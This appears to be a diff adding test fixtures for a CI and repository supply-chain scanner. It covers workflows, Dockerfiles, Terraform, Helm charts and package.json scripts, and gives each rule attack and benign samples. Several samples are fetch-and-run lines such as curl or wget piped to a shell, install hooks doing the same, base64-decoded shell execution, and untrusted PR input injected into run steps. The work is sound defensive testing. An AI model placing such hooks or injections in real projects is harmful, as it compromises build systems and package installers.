@@ -1,0 +1,277 @@
+# CI / repo supply-chain scan fixtures (item 22).
+#
+# These exercise the `cifile` rule module: GitHub Actions workflows,
+# Dockerfiles, Terraform configs, Helm chart files, and package.json
+# lifecycle scripts. Every fixture is a `file`-context scan — the module
+# selects checks by file_path.
+#
+# For each rule there is at least one attack fixture (block/warn) AND at
+# least one benign fixture (allow) proving a legitimate file stays clean.
+
+# ── GitHub Actions: unpinned action ─────────────────────────────────────
+
+[[fixture]]
+name = "workflow_action_pinned_to_tag"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "warn"
+expected_rules = ["workflow_unpinned_action"]
+
+[[fixture]]
+name = "workflow_action_pinned_to_branch"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: some-org/some-action@main\n"
+context = "file"
+file_path = ".github/workflows/release.yaml"
+expected_action = "warn"
+expected_rules = ["workflow_unpinned_action"]
+
+[[fixture]]
+name = "workflow_action_sha_pinned_clean"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608\n      - run: npm ci && npm test\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "workflow_local_action_clean"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/setup-env\n      - run: make build\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "allow"
+expected_rules = []
+
+# ── GitHub Actions: dangerous trigger ───────────────────────────────────
+
+[[fixture]]
+name = "workflow_pull_request_target_trigger"
+min_milestone = 3
+input = "name: PR\non:\n  pull_request_target:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo build\n"
+context = "file"
+file_path = ".github/workflows/pr.yml"
+expected_action = "block"
+expected_rules = ["workflow_dangerous_trigger"]
+
+[[fixture]]
+name = "workflow_plain_pull_request_clean"
+min_milestone = 3
+input = "name: PR\non:\n  pull_request:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo build\n"
+context = "file"
+file_path = ".github/workflows/pr.yml"
+expected_action = "allow"
+expected_rules = []
+
+# ── GitHub Actions: curl pipe shell in a run step ───────────────────────
+
+[[fixture]]
+name = "workflow_run_curl_pipe_bash"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl install.example | bash\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "block"
+expected_rules = ["workflow_curl_pipe_shell"]
+
+[[fixture]]
+name = "workflow_run_block_scalar_wget_pipe_sh"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo step one\n          wget setup.example | sh\n          echo step three\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "block"
+expected_rules = ["workflow_curl_pipe_shell"]
+
+[[fixture]]
+name = "workflow_run_plain_build_clean"
+min_milestone = 3
+input = "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          npm ci\n          npm run build\n          npm test\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "allow"
+expected_rules = []
+
+# ── GitHub Actions: untrusted input in a run step ───────────────────────
+
+[[fixture]]
+name = "workflow_untrusted_pr_title_in_run"
+min_milestone = 3
+input = "name: CI\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"PR ${{ github.event.pull_request.title }}\"\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "block"
+expected_rules = ["workflow_untrusted_input"]
+
+[[fixture]]
+name = "workflow_trusted_context_in_run_clean"
+min_milestone = 3
+input = "name: CI\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"commit ${{ github.sha }}\"\n"
+context = "file"
+file_path = ".github/workflows/ci.yml"
+expected_action = "allow"
+expected_rules = []
+
+# ── Dockerfile: un-pinned base image ────────────────────────────────────
+
+[[fixture]]
+name = "dockerfile_from_latest_tag"
+min_milestone = 3
+input = "FROM ubuntu:latest\nRUN apt-get update\nCMD [\"/bin/bash\"]\n"
+context = "file"
+file_path = "Dockerfile"
+expected_action = "warn"
+expected_rules = ["dockerfile_unpinned_image"]
+
+[[fixture]]
+name = "dockerfile_from_untagged"
+min_milestone = 3
+input = "FROM ubuntu\nRUN apt-get update\nCMD [\"/bin/bash\"]\n"
+context = "file"
+file_path = "docker/Dockerfile.prod"
+expected_action = "warn"
+expected_rules = ["dockerfile_unpinned_image"]
+
+[[fixture]]
+name = "dockerfile_digest_pinned_clean"
+min_milestone = 3
+input = "FROM ubuntu:22.04@sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\nRUN apt-get update\nCMD [\"/bin/bash\"]\n"
+context = "file"
+file_path = "Dockerfile"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "dockerfile_version_tag_clean"
+min_milestone = 3
+input = "FROM node:20.11.1\nWORKDIR /app\nCMD [\"node\", \"index.js\"]\n"
+context = "file"
+file_path = "Dockerfile"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+# Multi-stage build: two distinct external base images, both on a mutable tag
+# (a build stage on `:latest`, a runtime stage with no tag at all). The two
+# un-pinned FROM lines fold into a single dockerfile_unpinned_image finding —
+# the `FROM builder` stage reference is internal and must not add a third.
+name = "dockerfile_multi_from_two_unpinned_folded"
+min_milestone = 3
+input = "FROM golang:latest AS builder\nWORKDIR /src\nRUN go build -o app .\nFROM debian\nCOPY --from=builder /src/app /app\nCMD [\"/app\"]\n"
+context = "file"
+file_path = "Dockerfile"
+expected_action = "warn"
+expected_rules = ["dockerfile_unpinned_image"]
+
+# ── Terraform: remote module source ─────────────────────────────────────
+
+[[fixture]]
+name = "terraform_remote_git_module"
+min_milestone = 3
+input = "module \"vpc\" {\n  source = \"git::https://example.com/infra/vpc.git\"\n}\n"
+context = "file"
+file_path = "main.tf"
+expected_action = "warn"
+expected_rules = ["terraform_remote_module"]
+
+[[fixture]]
+name = "terraform_local_module_clean"
+min_milestone = 3
+input = "module \"vpc\" {\n  source = \"./modules/vpc\"\n  cidr   = \"10.0.0.0/16\"\n}\n"
+context = "file"
+file_path = "main.tf"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "terraform_registry_shorthand_clean"
+min_milestone = 3
+input = "module \"consul\" {\n  source  = \"hashicorp/consul/aws\"\n  version = \"0.11.0\"\n}\n"
+context = "file"
+file_path = "main.tf"
+expected_action = "allow"
+expected_rules = []
+
+# ── Helm chart: untrusted dependency repository ─────────────────────────
+
+[[fixture]]
+name = "helm_chart_untrusted_dependency_repo"
+min_milestone = 3
+input = "apiVersion: v2\nname: myapp\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 17.0.0\n    repository: https://charts.evil.example.com\n"
+context = "file"
+file_path = "Chart.yaml"
+expected_action = "warn"
+expected_rules = ["helm_untrusted_repo"]
+
+[[fixture]]
+name = "helm_chart_trusted_dependency_repo_clean"
+min_milestone = 3
+input = "apiVersion: v2\nname: myapp\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 17.0.0\n    repository: https://charts.bitnami.com/bitnami\n"
+context = "file"
+file_path = "Chart.yaml"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+# An OCI-registry chart dependency from an untrusted host. Helm 3 supports
+# `oci://` dependency repositories; an untrusted OCI host is the same
+# remote-pull risk as an untrusted https chart repo.
+name = "helm_chart_untrusted_oci_dependency_repo"
+min_milestone = 3
+input = "apiVersion: v2\nname: myapp\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 17.0.0\n    repository: oci://registry.evil.example.com/charts\n"
+context = "file"
+file_path = "Chart.yaml"
+expected_action = "warn"
+expected_rules = ["helm_untrusted_repo"]
+
+[[fixture]]
+# An OCI-registry chart dependency from a recognised host (ghcr.io is in the
+# trusted-host set) — must stay clean.
+name = "helm_chart_trusted_oci_dependency_repo_clean"
+min_milestone = 3
+input = "apiVersion: v2\nname: myapp\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 17.0.0\n    repository: oci://ghcr.io/example-org/charts\n"
+context = "file"
+file_path = "Chart.yaml"
+expected_action = "allow"
+expected_rules = []
+
+# ── package.json: dangerous lifecycle script ────────────────────────────
+
+[[fixture]]
+name = "package_json_postinstall_curl_pipe"
+min_milestone = 3
+input = '{"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "curl payload.example | bash"}}'
+context = "file"
+file_path = "package.json"
+expected_action = "block"
+expected_rules = ["package_script_dangerous"]
+
+[[fixture]]
+name = "package_json_preinstall_base64_decode_exec"
+min_milestone = 3
+input = '{"name": "pkg", "version": "1.0.0", "scripts": {"preinstall": "echo aGk= | base64 -d | sh"}}'
+context = "file"
+file_path = "package.json"
+expected_action = "block"
+expected_rules = ["package_script_dangerous"]
+
+[[fixture]]
+name = "package_json_benign_build_hook_clean"
+min_milestone = 3
+input = '{"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "node-gyp rebuild", "build": "tsc", "test": "jest"}}'
+context = "file"
+file_path = "package.json"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "package_json_no_install_hooks_clean"
+min_milestone = 3
+input = '{"name": "pkg", "version": "1.0.0", "scripts": {"build": "webpack", "test": "jest", "lint": "eslint ."}}'
+context = "file"
+file_path = "package.json"
+expected_action = "allow"
+expected_rules = []
